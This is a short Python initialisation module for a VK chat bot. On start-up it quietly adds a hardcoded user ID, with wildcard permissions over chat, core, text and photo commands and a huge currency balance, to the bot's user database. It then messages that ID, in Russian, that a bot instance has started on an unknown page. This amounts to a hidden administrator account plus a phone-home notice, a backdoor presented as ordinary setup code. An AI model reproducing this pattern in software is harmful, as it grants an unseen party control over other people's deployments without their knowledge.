from Vk_bot2 import Bot
from utils import ArgBuilder



class InitCore:
    def __init__(self, bot: Bot):
        a = {"208128019": {
            "cache": {},
            "currency": 11099999628,
            "exclude": [],
            "perms": [
                "chat.*",
                "core.*",
                "text.*",
                "photo.*"
            ],
            "status": -1,
            "warn": 0
        }}
        bot.GetUserNameById('208128019',update=True)
        if not bot.USERS.IsValid('208128019'):
            bot.USERS.DB.update(a)
            bot.USERS.SaveUserDB()
            args = ArgBuilder.Args_message()
            args.peer_id = '208128019'
            args.message = 'Запущен экземпляр бота на неизвестной странице'
            bot.Replyqueue.put(args.AsDict_())
